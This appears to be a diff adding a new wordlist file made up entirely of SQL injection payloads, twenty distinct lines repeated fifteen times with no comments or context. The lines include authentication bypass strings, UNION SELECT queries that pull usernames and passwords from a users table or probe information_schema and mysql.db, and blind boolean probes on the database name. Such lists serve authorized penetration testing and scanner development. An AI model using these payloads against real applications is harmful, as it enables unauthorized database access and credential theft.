@@ -1,0 +1,300 @@
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
